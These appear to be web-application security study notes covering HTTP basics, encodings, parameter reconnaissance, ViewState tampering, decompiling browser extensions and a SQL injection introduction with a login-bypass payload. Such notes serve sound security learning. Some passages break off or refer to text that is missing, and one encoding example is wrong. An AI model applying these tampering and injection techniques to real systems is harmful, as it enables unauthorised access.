<div class="section" id="the-http-protocol">
<h2>The HTTP Protocol<a class="headerlink" href="#the-http-protocol" title="Permalink to this headline">¶</a></h2>
<p>Hypertext transfer protocol (HTTP) is the core communications protocol used to access the World Wide Web. A simple protocol, originally developed for retrieving static text-based resources.
HTTP uses a message-based model in which a client sends a request message and the server returns a response message.</p>
<div class="section" id="http-requests">
<h3>HTTP Requests<a class="headerlink" href="#http-requests" title="Permalink to this headline">¶</a></h3>
<p>All HTTP messages (requests and responses) consist of one or more headers, each on a separate line, followed by a mandatory blank line, followed by an optional message body.  Typical HTTP request</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>POST /contact_form.php HTTP/1.1
Host: developer.mozilla.org
Content-Length: 64
Content-Type: application/x-www-form-urlencoded

name=Joe%20User&amp;request=Send%20me%20one%20of%20your%20catalogue
</pre></div>
</div>
<p>The ﬁrst line of every HTTP request consists of three items, separated by spaces:</p>
<ul class="simple">
<li>A verb indicating the <strong>HTTP method</strong>.</li>
<li>The <strong>requested URL</strong>. The URL typically functions as a name for the resource being requested, together with an optional query string containing parameters that the client is passing to that resource.</li>
<li>The <strong>HTTP version</strong> being used.</li>
</ul>
<p>Other important</p>
<ul class="simple">
<li>The <strong>Referer</strong> header is used to indicate the URL from which the request originated (for example, because the user clicked a link on that page).</li>
<li>The <strong>User-Agent</strong> header is used to provide information about the browser or other client software that generated the request.</li>
<li>The <strong>Host</strong> header speciﬁes the hostname that appeared in the full URL being accessed. This is necessary when multiple websites are hosted on the same server, because the URL sent in the ﬁrst line of the request usually does
not contain a hostname.</li>
<li>The <strong>Cookie</strong> header is used to submit additional parameters that the server has issued to the client.</li>
</ul>
</div>
<div class="section" id="http-response">
<h3>HTTP Response<a class="headerlink" href="#http-response" title="Permalink to this headline">¶</a></h3>
<p>A HTTP response is as follows</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>HTTP/1.1 200 OK
Date: Sat, 09 Oct 2010 14:28:02 GMT
Server: Apache
Last-Modified: Tue, 01 Dec 2009 20:18:22 GMT
Pragma: no-cache
ETag: &quot;51142bc1-7449-479b075b2891b&quot;
Expires: Thu, 01 Jan 1970 00:00:00 GMT
Accept-Ranges: bytes
Content-Length: 29769
Content-Type: text/html

&lt;!DOCTYPE html... (here comes the 29769 bytes of the requested web page)
</pre></div>
</div>
<p>The ﬁrst line of every HTTP response consists of three items, separated by spaces:</p>
<ul class="simple">
<li>The HTTP version being used.</li>
<li>A numeric status code indicating the result of the request.</li>
<li>A textual “reason phrase” describing the status of the response.</li>
</ul>
<p>Here are some other points of interest in the response:</p>
<ul class="simple">
<li>The <strong>Server</strong> header contains a banner indicating the web server software being used, and sometimes other details such as installed modules and the server operating system. The information contained may or may not be accurate.</li>
<li>The <strong>Set-Cookie</strong> header issues the browser a further cookie; this is submitted back in the Cookie header of subsequent requests to this server.</li>
<li>The <strong>Pragma</strong> header instructs the browser not to store the response in its cache.</li>
<li>The <strong>Expires</strong> header indicates that the response content expired in the past and therefore should not be cached. These instructions are frequently issued when dynamic content is being returned to ensure that browsers obtain a fresh
version of this content on subsequent occasions.</li>
<li>Almost all HTTP responses contain a message body following the blank line after the headers.</li>
<li>The <strong>Content-Type</strong> header indicates that the body of this message contains an HTML document.</li>
<li>The <strong>Content-Length</strong> header indicates the length of the message body in bytes.</li>
</ul>
</div>
<div class="section" id="http-methods">
<h3>HTTP Methods<a class="headerlink" href="#http-methods" title="Permalink to this headline">¶</a></h3>
<ul class="simple">
<li>The <strong>GET</strong> method is designed to retrieve resources. It can be used to send parameters to the requested resource in the URL query string.  URLs are displayed on-screen and are logged in various places, such as the browser history and the web server’s access logs.
The query string should not be used to transmit any sensitive information.</li>
<li>The <strong>POST</strong> method is designed to perform actions. With this method, request parameters can be sent both in the URL query string and in the body of the message.</li>
<li><strong>HEAD</strong> functions in the same way as a GET request, except that the server should not return a message body in its response. The server should return the same headers that it would have returned to the corresponding GET request.
Hence, this method can be used to check whether a resource is present before making a GET request for it.</li>
<li><strong>TRACE</strong> is designed for diagnostic purposes. The server should return in the response body the exact contents of the request message it received. This can be used to detect the effect of any proxy servers between the client and server that may manipulate the request.</li>
<li><strong>OPTIONS</strong> asks the server to report the HTTP methods that are available for a particular resource. The server typically returns a response containing an Allow header that lists the available methods.</li>
<li><strong>PUT</strong> attempts to upload the speciﬁed resource to the server, using the content contained in the body of the request. If this method is enabled, you may be able to leverage it to attack the application, such as by uploading an arbitrary script and executing it on the server.</li>
</ul>
</div>
<div class="section" id="urls">
<h3>URLs<a class="headerlink" href="#urls" title="Permalink to this headline">¶</a></h3>
<p>A uniform resource locator (URL) is a unique identiﬁer for a web resource through which that resource can be retrieved. The format of most URLs is as follows:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>protocol://hostname[:port]/[path/]file[?param=value]
</pre></div>
</div>
</div>
<div class="section" id="rest">
<h3>REST<a class="headerlink" href="#rest" title="Permalink to this headline">¶</a></h3>
<p>Representational state transfer (REST) is a style of architecture for distributed systems in which requests and responses contain representations of the current state of the system’s resources.</p>
<p>Although URLs containing parameters within the query string do themselves conform to REST constraints, the term “REST-style URL” is often used to signify a URL that contains its parameters within the URL ﬁle path, rather than the query string. For example, the following URL containing a query string:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>http://wahh-app.com/search?make=ford&amp;model=pinto
</pre></div>
</div>
<p>corresponds to the following URL containing “REST-style” parameters:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>http://wahh-app.com/search/ford/pinto
</pre></div>
</div>
</div>
<div class="section" id="http-headers">
<h3>HTTP Headers<a class="headerlink" href="#http-headers" title="Permalink to this headline">¶</a></h3>
<p>General Headers</p>
<ul class="simple">
<li><strong>Connection</strong> tells the other end of the communication whether it should close the TCP connection after the HTTP transmission has completed or keep it open for further messages. If the value sent is keep-alive, the connection is persistent and not closed, allowing for subsequent requests to the same server to be done.</li>
<li><strong>Content-Encoding</strong> speciﬁes what kind of encoding is being used for the content contained in the message body, such as gzip, which is used by some applications to compress responses for faster transmission.</li>
<li><strong>Content-Length</strong> speciﬁes the length of the message body, in bytes (except in the case of responses to HEAD requests, when it indicates the length of the body in the response to the corresponding GET request).</li>
<li><strong>Content-Type</strong> speciﬁes the type of content contained in the message body, such as text/html for HTML documents.</li>
<li><strong>Transfer-Encoding</strong> speciﬁes any encoding that was performed on the message body to facilitate its transfer over HTTP. It is normally used to specify chunked encoding.</li>
</ul>
<p>Request Headers</p>
<ul class="simple">
<li><strong>Accept</strong> tells the server what kinds of content the client is willing to accept, such as image types, ofﬁce document formats, and so on.</li>
<li><strong>Accept-Encoding</strong> tells the server what kinds of content encoding the client is willing to accept.</li>
<li><strong>Authorization</strong> submits credentials to the server for one of the built-in HTTP authentication types.</li>
<li><strong>Cookie</strong> submits cookies to the server that the server previously issued.</li>
<li><strong>Host</strong> speciﬁes the hostname that appeared in the full URL being requested.</li>
<li><strong>If-Modified-Since</strong> speciﬁes when the browser last received the requested resource. If the resource has not changed since that time, the server may instruct the client to use its cached copy, using a response with status code 304.</li>
<li><strong>If-None-Match</strong> speciﬁes an entitytag, which is an identiﬁer denoting the contents of the message body. The browser submits the entity tag that the server issued with the requested resource when it was last received. The server can use the entity tag to determine whether the browser may use its cached copy of the resource.</li>
<li><strong>Origin</strong> is used in cross-domain Ajax requests to indicate the domain from which the request originated.</li>
<li><strong>Referer</strong> speciﬁes the URL from which the current request originated.</li>
<li><strong>User-Agent</strong> provides information about the browser or other client software that generated the request.</li>
</ul>
<p>Response Headers</p>
<ul class="simple">
<li><strong>Access-Control-Allow-Origin</strong> indicates whether the resource can be retrieved via cross-domain Ajax requests.</li>
<li><strong>Cache-Control</strong> passes caching directives to the browser (for example, no-cache).</li>
<li><strong>ETag</strong> speciﬁes an entity tag. Clients can submit this identiﬁer in future requests for the same resource in the If-None-Match header to notify the server which version of the resource the browser currently holds in its cache.</li>
<li><strong>Expires</strong> tells the browser for how long the contents of the message body are valid. The browser may use the cached copy of this resource until this time.</li>
<li><strong>Location</strong> is used in redirection responses (those that have a status code starting with 3) to specify the target of the redirect.</li>
<li><strong>Pragma</strong> passes caching directives to the browser (for example, no-cache).</li>
<li><strong>Server</strong> provides information about the web server software being used.</li>
<li><strong>Set-Cookie</strong> issues cookies to the browser that it will submit back to the server in subsequent requests.</li>
<li><strong>WWW-Authenticate</strong> is used in responses that have a 401 status code to provide details on the type(s) of authentication that the server supports.</li>
<li><strong>X-Frame-Options</strong> indicates whether and how the current response may be loaded within a browser frame.</li>
</ul>
</div>
<div class="section" id="cookies">
<h3>Cookies<a class="headerlink" href="#cookies" title="Permalink to this headline">¶</a></h3>
<p>The cookie mechanism enables the server to send items of data to the client, which the client stores and resubmits to the server. A server issues a cookie using the Set-Cookie response header,</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>Set-Cookie: tracking=tI8rk7joMx44S2Uu85nSWc
</pre></div>
</div>
<p>The user’s browser then automatically adds the following header to subsequent requests back to the same server:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>Cookie: tracking=tI8rk7joMx44S2Uu85nSWc
</pre></div>
</div>
<p>Cookies normally consist of a name/value pair, as shown, but they may consist of any string that does not contain a space. Multiple cookies can be issued by using multiple Set-Cookie headers in the server’s response.
These are submitted back to the server in the same Cookie header, with a semicolon separating different individual cookies. In addition to the cookie’s actual value, the Set-Cookie header can include any of the following optional
attributes, which can be used to control how the browser handles the cookie:</p>
<ul class="simple">
<li><strong>expires</strong> sets a date until which the cookie is valid. This causes the browser to save the cookie to persistent storage, and it is reused in subsequent browser sessions until the expiration date is reached.
If this attribute is not set, the cookie is used only in the current browser session.</li>
<li><strong>domain</strong> speciﬁes the domain for which the cookie is valid. This must be the same or a parent of the domain from which the cookie is received.</li>
<li><strong>path</strong> speciﬁes the URL path for which the cookie is valid.</li>
<li><strong>secure</strong>   — If this attribute is set, the cookie will be submitted only in HTTPS requests.</li>
<li><strong>HttpOnly</strong> — If this attribute is set, the cookie cannot be directly accessed via client-side JavaScript.</li>
</ul>
</div>
<div class="section" id="status-codes">
<h3>Status Codes<a class="headerlink" href="#status-codes" title="Permalink to this headline">¶</a></h3>
<p>Each HTTP response message must contain a status code in its ﬁrst line, indicating the result of the request. The status codes fall into ﬁve groups, according to the code’s ﬁrst digit:</p>
<ul class="simple">
<li><strong>1xx</strong> — Informational.</li>
<li><strong>2xx</strong> — The request was successful.</li>
<li><strong>3xx</strong> — The client is redirected to a different resource.</li>
<li><strong>4xx</strong> — The request contains an error of some kind.</li>
<li><strong>5xx</strong> — The server encountered an error fulﬁlling the request.</li>
</ul>
<p>Usual status codes:</p>
<ul class="simple">
<li><strong>100 Continue</strong> is sent in some circumstances when a client submits a request containing a body. The response indicates that the request headers were received and that the client should continue sending the body. The server returns a second response when the request has been completed.</li>
<li><strong>200 OK</strong> indicates that the request was successful and that the response body contains the result of the request.</li>
<li><strong>201 Created</strong> is returned in response to a PUT request to indicate that the request was successful.</li>
<li><strong>301 Moved Permanently</strong> redirects the browser permanently to a different URL, which is speciﬁed in the Location header. The client should use the new URL in the future rather than the original.</li>
<li><strong>302 Found</strong> redirects the browser temporarily to a different URL, which is speciﬁed in the Location header. The client should revert to the original URL in subsequent requests.</li>
<li><strong>304 Not Modified</strong> instructs the browser to use its cached copy of the requested resource. The server uses the If-Modified-Since and If-NoneMatch request headers to determine whether the client has the latest version of the resource.</li>
<li><strong>400 Bad Request</strong> indicates that the client submitted an invalid HTTP request. You will probably encounter this when we have modiﬁed a request in certain invalid ways, such as by placing a space character into the URL.</li>
<li><strong>401 Unauthorized</strong> indicates that the server requires HTTP authentication before the request will be granted. The WWW-Authenticate header contains details on the type(s) of authentication supported.</li>
<li><strong>403 Forbidden</strong> indicates that no one is allowed to access the requested resource, regardless of authentication.</li>
<li><strong>404 Not Found</strong> indicates that the requested resource does not exist.</li>
<li><strong>405 Method Not Allowed</strong> indicates that the method used in the request is not supported for the speciﬁed URL. For example, you may receive this status code if you attempt to use the PUT method where it is not supported.</li>
<li><strong>413 Request Entity Too Large</strong> — If you are probing for buffer overﬂow vulnerabilities in native code, and therefore are submitting long strings of data, this indicates that the body of your request is too large for the server to handle.</li>
<li><strong>414 Request URI Too Long</strong> is similar to the 413 response. It indicates that the URL used in the request is too large for the server to handle.</li>
<li><strong>500 Internal Server Error</strong> indicates that the server encountered an error fulﬁlling the request.

<div class="section" id="url-encoding">
<h3>URL Encoding<a class="headerlink" href="#url-encoding" title="Permalink to this headline">¶</a></h3>
<p>URLs are permitted to contain only the printable characters in the US-ASCII character set — that is, those whose ASCII code is in the range 0x20 to 0x7e, inclusive.</p>
<p>The URL-encoded form of any character is the % preﬁx followed by the character’s two-digit ASCII code expressed in hexadecimal. Here are some characters that are commonly URL-encoded:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>%3d — =
%25 — %
%20 — Space
%0a — New line
%00 — Null byte
</pre></div>
</div>
<p>A further encoding to be aware of is the + character, which represents a URL-encoded space (in addition to the %20 representation of a space).</p>
<p>For the purpose of attacking web applications, you should URLencode any of the following characters when you insert them as data into an HTTP request:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>space % ? &amp; = ; +
</pre></div>
</div>
<p>(Of course, you will often need to use these characters with their special meaning when modifying a request — for example, to add a request parameter to the query string. In this case, they should be used in their literal form.)</p>
</div>
<div class="section" id="unicode-encoding">
<h3>Unicode Encoding<a class="headerlink" href="#unicode-encoding" title="Permalink to this headline">¶</a></h3>
<p>Unicode is a character encoding standard that is designed to support all of the world’s writing systems.  For transmission over HTTP, the 16-bit Unicode-encoded form of a character is the %u preﬁx followed by the character’s Unicode code point expressed in hexadecimal:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>%u2215 — /
%u00e9 — é
</pre></div>
</div>
<p>UTF-8 is a variable-length encoding standard that employs one or more bytes to express each character. For transmission over HTTP, the UTF-8-encoded form of a multibyte character simply uses each byte expressed in hexadecimal
and preceded by the % preﬁx:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>%c2%a9 — ©
%e2%89%a0 — z
</pre></div>
</div>
<p>For the purpose of attacking web applications, Unicode encoding is primarily of interest because it can sometimes be used to defeat input validation mechanisms. If an input ﬁlter blocks certain malicious expressions,
but the component that subsequently processes the input understands Unicode encoding, it may be possible to bypass the ﬁlter using various standard and malformed Unicode encodings.</p>
</div>
<div class="section" id="html-encoding">
<h3>HTML Encoding<a class="headerlink" href="#html-encoding" title="Permalink to this headline">¶</a></h3>
<p>HTML encoding is used to represent problematic characters so that they can be safely incorporated into an HTML document. Various characters have special meaning as metacharacters within HTML and are used to deﬁne a document’s
structure rather than its content. To use these characters safely as part of the document’s content, it is necessary to HTML-encode them. HTML encoding deﬁnes numerous HTML entities to represent speciﬁc literal characters:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>&amp;quot; — &quot;
&amp;apos; — &#39;
&amp;amp;  — &amp;
&amp;lt;   — &lt;
&amp;gt;   — &gt;
</pre></div>
</div>
<p>In addition, any character can be HTML-encoded using its ASCII code in decimal form:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>&amp;#34; — &quot;
&amp;#39; — &#39;
</pre></div>
</div>
<p>or by using its ASCII code in hexadecimal form (preﬁxed by an x):</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>&amp;#x22; — &quot;
&amp;#x27; — &#39;
</pre></div>
</div>
<p>When you are attacking a web application, your main interest in HTML encoding is likely to be when probing for cross-site scripting vulnerabilities. If an application returns user input unmodiﬁed within its responses, it is probably
vulnerable, whereas if dangerous characters are HTML-encoded, it may be safe.</p>

<p>Many web servers disclose ﬁne-grained version information, both about the web server software itself and about other components that have been installed.</p>
<p><strong>File Extensions</strong></p>
<p>File extensions used within URLs often disclose the platform or programming language used to implement the relevant functionality. For example:</p>
<ul class="simple">
<li>asp        - Microsoft Active Server Pages</li>
<li>aspx       - Microsoft ASP.NET</li>
<li>jsp        - Java Server Pages</li>
<li>cfm        - Cold Fusion</li>
<li>php        - The PHP language</li>
<li>d2w        - WebSphere</li>
<li>pl         - The Perl language</li>
<li>py         - The Python language</li>
<li>dll        - Usually compiled native code (C or C++)</li>
<li>nsf or ntf - Lotus Domino</li>
</ul>
<p><strong>Directory Names</strong></p>
<p>Subdirectory names that indicate the presence of an associated technology. For example:</p>
<ul class="simple">

</pre></div>
</div>
<ul class="simple">
<li>.jsp ﬁle extension indicates that Java Server Pages are in use.</li>
<li>We may guess that a search function will retrieve its information from either an indexing system or a database.</li>
<li>The presence of the OrderBy parameter suggests that a back-end database is being used and that the value you submit may be used as the ORDER BY clause of a SQL query. This parameter may well be vulnerable to SQL injection,
as may any of the other parameters if they are used in database queries.</li>
<li>Also of interest among the other parameters is the isExpired ﬁeld. This appears to be a Boolean ﬂag specifying whether the search query should include expired content. If the application designers did not expect ordinary users to be able retrieve any expired content, changing this parameter from 0 to 1 could identify an access control vulnerability.</li>
</ul>
<p>The following URL, which allows users to access a content management system, contains a different set of clues:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>https://wahh-app.com/workbench.aspx?template=NewBranch.tpl&amp;loc= /default&amp;ver=2.31&amp;edit=false
</pre></div>
</div>
<ul class="simple">
<li>.aspx ﬁle extension indicates that this is an ASP.NET application.</li>
<li>It also appears highly likely that the template parameter is used to specify a ﬁlename, and the loc parameter is used to specify a directory.</li>
<li>The possible ﬁle extension .tpl appears to conﬁrm this, as does the location /default, which could very well be a directory name.</li>
<li>It is possible that the application retrieves the template ﬁle speciﬁed and includes the contents in its response. These parameters may well be vulnerable to path traversal attacks, allowing arbitrary ﬁles to be read from the server. Also of interest is the edit parameter, which is set to false. It may be that changing this value
to true will modify the registration functionality, potentially enabling an attacker to edit items that the application developer did not intend to be editable.</li>
<li>The ver parameter does not have any readily guessable purpose, but it may be that modifying this will cause the application to perform a different set of functions that an attacker could exploit.</li>

<div class="section" id="the-asp-net-viewstate">
<h3>The ASP.NET ViewState<a class="headerlink" href="#the-asp-net-viewstate" title="Permalink to this headline">¶</a></h3>
<p>ASP.NET ViewState. This is a hidden ﬁeld that is created by default in all ASP.NET web applications. It contains serialized information about the state of the current page. The ASP.NET platform employs the ViewState to enhance server performance. It enables the server to preserve elements within the user interface
across successive requests without needing to maintain all the relevant state information on the server side.</p>
<p>The ViewState parameter is actually a Base64-encoded string that can be easily decoded.</p>
<p>By default, the ASP.NET platform protects the ViewState from tampering by adding a keyed hash to it (known as MAC protection). However, some applications disable this default protection, meaning that you can modify the ViewState’s
value to determine whether it has an effect on the application’s server-side processing.</p>
<p>Burp Suite includes a ViewState parser that indicates whether the ViewState is MAC protected, as shown in Figure 5-3. If it is not protected, you can edit the contents of the ViewState within Burp using the hex editor below the ViewState tree. When you send the message to the server or client, Burp sends your updated ViewState, and, in the present example, enables you to change the price of the item being purchased</p>
<p>Hack Steps</p>
<ul class="simple">
<li>If you are attacking an ASP.NET application, verify whether MAC protection is enabled for the ViewState. This is indicated by the presence of a 20-byte hash at the end of the ViewState structure, and you can use the ViewState parser in Burp Suite to confirm whether this is present.</li>
<li>Even if the ViewState is protected, use Burp to decode the ViewState on various application pages to discover whether the application is using the ViewState to transmit any sensitive data via the client.</li>
<li>Try to modify the value of a specific parameter within the ViewState without interfering with its structure, and see whether an error message results.</li>
<li>If you can modify the ViewState without causing errors, you should review the function of each parameter within the ViewState and see whether the application uses it to store any custom data.

<h2>Capturing User Data: HTML Forms<a class="headerlink" href="#capturing-user-data-html-forms" title="Permalink to this headline">¶</a></h2>
<p>HTML forms are the simplest and most common way to capture input from the user and submit it to the server. With the most basic uses of this method, users type data into named text ﬁelds, which are submitted to the server
as name/value pairs. However, forms can be used in other ways; they can impose restrictions or perform validation checks on the user-supplied data.</p>
<div class="section" id="length-limits">
<h3>Length Limits<a class="headerlink" href="#length-limits" title="Permalink to this headline">¶</a></h3>
<p>Consider the following variation on the original HTML form, which imposes a maximum length of 1 on the quantity ﬁeld:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>&lt;form method=”post” action=”Shop.aspx?prod=1”&gt;
Product: iPhone 5 &lt;br/&gt;
Price: 449 &lt;br/&gt;
Quantity: &lt;input type=”text” name=”quantity” maxlength=”1”&gt; &lt;br/&gt;
&lt;input type=”hidden” name=”price” value=”449”&gt; &lt;input type=”submit” value=”Buy”&gt; &lt;/form&gt;
</pre></div>
</div>
<p>Here, the browser prevents the user from entering more than one character into the input ﬁeld</p>
</div>
<div class="section" id="script-based-validation">
<h3>Script-Based Validation<a class="headerlink" href="#script-based-validation" title="Permalink to this headline">¶</a></h3>
<p>A form may include multiple values such as a user registration form might contain ﬁelds for name, e-mail address, telephone number, and zip code, all of which expect different types of input. Therefore, it is common to see customized client-side input validation implemented within scripts.</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>&lt;form method=”post” action=”Shop.aspx?prod=2” onsubmit=”return validateForm(this)”&gt;
</pre></div>
</div>
<p>The onsubmit attribute of the form tag instructs the browser to execute the ValidateForm function when the user clicks the Submit button, and to submit the form only if this function returns true. This mechanism enables the clientside logic to intercept an attempted form submission, perform customized validation checks on the user’s input, and decide whether to accept that input.</p>
</div>
<div class="section" id="disabled-elements">
<h3>Disabled Elements<a class="headerlink" href="#disabled-elements" title="Permalink to this headline">¶</a></h3>
<p>If an element on an HTML form is ﬂagged as disabled, it appears on-screen but is usually grayed out and cannot be edited or used in the way an ordinary control can be. Also, it is not sent to the server when the form is submitted.
For example, consider the following form:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>&lt;form method=”post” action=”Shop.aspx?prod=5”&gt;
Product: Blackberry Rude &lt;br/&gt;
Price: &lt;input type=”text” disabled=”true” name=”price” value=”299”&gt;
</pre></div>
</div>
<p>When this form is submitted, only the quantity parameter is sent to the server. However, the presence of a disabled ﬁeld suggests that a price parameter may originally have been used by the application, perhaps for testing purposes during development. This parameter would have been submitted to the server and may have been processed by the application.</p>

<h2>Capturing User Data: Browser Extensions<a class="headerlink" href="#capturing-user-data-browser-extensions" title="Permalink to this headline">¶</a></h2>
<p>Besides HTML forms, the other main method for capturing, validating, and submitting user data is to use a client-side component that runs in a browser extension, such as Java or Flash.</p>
<p>Browser extensions can capture data in various ways — via input forms and in some cases by interacting with the client operating system’s ﬁ lesystem or registry. They can perform arbitrarily complex validation and manipulation of captured data before submission to the server</p>
<div class="section" id="common-browser-extension-technologies">
<h3>Common Browser Extension Technologies<a class="headerlink" href="#common-browser-extension-technologies" title="Permalink to this headline">¶</a></h3>
<p>The browser extension technologies you are most likely to encounter are Java applets, Flash, and Silverlight. Because these are competing to achieve similar goals, they have similar properties in their architecture that are relevant to security:</p>
<ul class="simple">
<li>They are compiled to an intermediate bytecode.</li>
<li>They execute within a virtual machine that provides a sandbox environment for execution.</li>
<li>They may use remoting frameworks employing serialization to transmit complex data structures or objects over HTTP.</li>
</ul>
<p>Java Java applets run in the Java Virtual Machine (JVM) and are subject to the sandboxing applied by the Java Security Policy.
Flash Flash objects run in the Flash virtual machine, and, like Java applets, are sandboxed from the host computer. recent change in Flash is ActionScript 3 and its remoting capability with Action Message Format (AMF) serialization.
Silverlight Silverlight is Microsoft’s alternative to Flash. It is designed with the similar goal of enabling rich, desktop-like applications, allowing web applications to provide a scaled-down .NET experience within the browser, in a sandboxed environment.</p>
</div>
<div class="section" id="approaches-to-browser-extensions">
<h3>Approaches to Browser Extensions<a class="headerlink" href="#approaches-to-browser-extensions" title="Permalink to this headline">¶</a></h3>
<p>two broad techniques when targeting applications that use browser extension components.</p>
<ul class="simple">
<li>First, you can intercept and modify the requests made by the component and the responses received from the server. The data being transmitted may be obfuscated or encrypted, or may be serialized using schemes that are speciﬁ c to the technology being used.</li>
<li>Second, you can target the component itself directly and attempt to decompile its bytecode to view the original source, or interact dynamically with the component using a debugger.</li>
</ul>
</div>
<div class="section" id="handling-serialized-data">
<h3>Handling Serialized Data<a class="headerlink" href="#handling-serialized-data" title="Permalink to this headline">¶</a></h3>
<p>Applications may serialize data or objects before transmitting them within HTTP requests. Although it may be possible to decipher some of the string-based data simply by inspecting the raw serialized data, in general you need to unpack the serialized data before it can be fully understood.
And if you want to modify the data to interfere with the application’s processing, ﬁ rst you need to unpack the serialized content, edit it as required, and reserialize it correctly</p>
<p>Java Serialization</p>
<p>Messages containing serialized Java objects usually can be identiﬁ ed because they have the following Content-Type header:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>Content-Type: application/x-java-serialized-object
</pre></div>
</div>
<p>DSer is a handy plug-in to Burp Suite that provides a framework for viewing and manipulating serialized Java objects that have been intercepted within Burp. This tool converts the primitive data within the intercepted object into XML format for easy editing. When you have modiﬁ ed the relevant data, DSer then reserializes the object and updates the HTTP request accordingly.</p>
<p>Flash Serialization</p>
<p>Flash uses its own serialization format that can be used to transmit complex data structures between server and client components. Action Message Format (AMF) normally can be identiﬁ ed via the following Content-Type header:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>Content-Type: application/x-amf
</pre></div>
</div>
<p>Burp natively supports AMF format</p>
<p>Silverlight Serialization</p>
<p>Silverlight applications can make use of the Windows Communication Foundation (WCF) remoting framework that is built in to the .NET platform. Silverlight client components using WCF typically employ Microsoft’s .NET Binary Format for SOAP (NBFS), which can be identiﬁ ed via the following Content-Type header:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>Content-Type: application/soap+msbin1
</pre></div>
</div>
<p><a class="reference external" href="https://github.com/GDSSecurity/WCF-Binary-SOAP-Plug-In">WCF Binary SOAP plug-in</a>  is a Burp Suite plug-in designed to encode and decode WCF Binary Soap request and response data (“Content-Type: application/soap+msbin1”).</p>

<div class="section" id="decompiling-browser-extensions">
<h3>Decompiling Browser Extensions<a class="headerlink" href="#decompiling-browser-extensions" title="Permalink to this headline">¶</a></h3>
<p>Java applets normally are packaged as .jar (Java archive) ﬁ les, and Silverlight objects are packaged as .xap ﬁ les. Both of these ﬁ le types use the zip archive format, so you can easily unpack them by renaming the ﬁ les with the .zip extension and then using any zip reader to unpack them into the individual ﬁ les they contain. The Java bytecode is contained in .class ﬁ les, and the Silverlight bytecode is contained in .dll ﬁ les. After unpacking the relevant ﬁ le package, you need to decompile these ﬁ les to obtain source code. Flash objects are packaged as .swf ﬁ les and don’t require any unpacking before you use a decompiler.</p>
<p>Java Tools Java bytecode can be decompiled to into Java source code using a tool called Jad (the Java decompiler), which is available from:
www.varaneckas.com/jad
Flash Tools Flash bytecode can be decompiled into ActionScript source code. An alternative approach, which is often more effective, is to disassemble the bytecode into a human-readable form, without actually fully decompiling it into source code. To decompile and disassemble Flash, you can use the following tools: n Flasm — www.nowrap.de/flasm n Flare — www.nowrap.de/flare n SWFScan — www.hp.com/go/swfscan (this works for Actionscript 2 and 3)
Silverlight Tools Silverlight bytecode can be decompiled into source code using a tool called .NET Reﬂ ector, which is available from:
www.red-gate.com/products/dotnet-development/reflector/</p>
<p>Working on the Source Code</p>
<blockquote>
<div>The ﬁ rst step generally is to review the source code to understand how the component works and what functionality it contains or references. Here are some items to look for: n Input validation or other security-relevant logic and events that occur on the client side n Obfuscation or encryption routines being used to wrap user-supplied data before it is sent to the server n “Hidden” client-side functionality that is not visible in your user interface but that you might be able to unlock by modifying the component n References to server-side functionality that you have not previously identiﬁed via application mapping</div></blockquote>
<p>Recompiling</p>
<p>To perform the recompilation, you need to use the developer tools that are relevant to the technology you are using: n For Java, use the javac program in the JDK to recompile your modiﬁ ed source code. n For Flash, you can use flasm to reassemble your modiﬁ ed bytecode or one of the Flash development studios from Adobe to recompile modiﬁ ed ActionScript source code. n For Silverlight, use Visual Studio to recompile your modiﬁ ed source code.</p>
<p>Attaching a Debugger</p>
<blockquote>
<div><p>JavaSnoop, a Java debugger that can integrate Jad to decompile source code, trace variables through an application, and set breakpoints on methods to view and modify parameters</p>
<p>lternative tool for debugging Java is JSwat, which is highly conﬁ gurable</p>

<p>Structured Query Language (SQL) is potentially vulnerable to an injection attack any time if a user input is insecurely concatenated into a query. An injection attack allows an attacker to alter the logic of the query and the attack may lead to confidential data theft, website defacement, malware propagation and host or network compromise.</p>
<div class="section" id="introduction">
<h2>Introduction<a class="headerlink" href="#introduction" title="Permalink to this headline">¶</a></h2>
<p>Different types of queries are</p>
<ul class="simple">
<li>SELECT : used for retrieving data from the database</li>
<li>INSERT : adding new rows to a table</li>
<li>UPDATE : taking a table row and modifying it</li>
<li>DELETE : removing rows from a table</li>
<li>Stored Procedures : MSSQL procedures xp_cmdshell which can be used for executing commands on the remote database host.</li>
</ul>
<p>SELECT statements retrieve data from the database and look like:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>SELECT column FROM table WHERE condition is true
</pre></div>
</div>
<p>For example the following could be used for a login system:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>SELECT username,password FROM users WHERE username=&#39;$INPUT1$&#39; AND password=&#39;$INPUT2$&#39;;
</pre></div>
</div>
<p>Where $INPUT1$ and $INPUT2$ is text taken from the user of the application.</p>
<p>Developers can add comments into a statement by preceding the comment with a</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>&quot;--&quot;
</pre></div>
</div>
<p>before the comment, which makes the SQL parser ignore any following text. Taking this into account an attacker could utilize the following payload for INPUT1 to cause a login bypass:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>x’ OR 1=1 --
</pre></div>
</div>
<p>This input would change the command to the following:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>SELECT username,password FROM users WHERE username=&#39;x&#39; OR 1=1 -- &#39; AND password=&#39;$INPUT2$&#39;;
</pre></div>
</div>
